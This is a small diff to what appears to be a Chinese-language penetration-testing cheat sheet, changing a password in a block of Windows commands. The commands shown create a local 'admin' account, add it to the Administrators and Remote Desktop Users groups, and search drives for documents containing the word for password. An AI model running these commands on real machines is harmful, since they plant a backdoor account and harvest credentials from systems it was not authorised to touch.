@@ -164,7 +164,7 @@ dir /a /s /b c:\*.txt *.xls *.xlsx *.docx | findstr "密码" >C:\Users\1.txt
 [RDP 连接多开方法与利用思路](https://mp.weixin.qq.com/s/GCFCIwqnQUAFNED0dTVDoA)
 
 ```bash
-net user admin 123456 /add
+net user admin 1qaz@WSX /add
 net localgroup administrators admin /add
 net localgroup "Remote Desktop Users" admin /add 2>nul
 
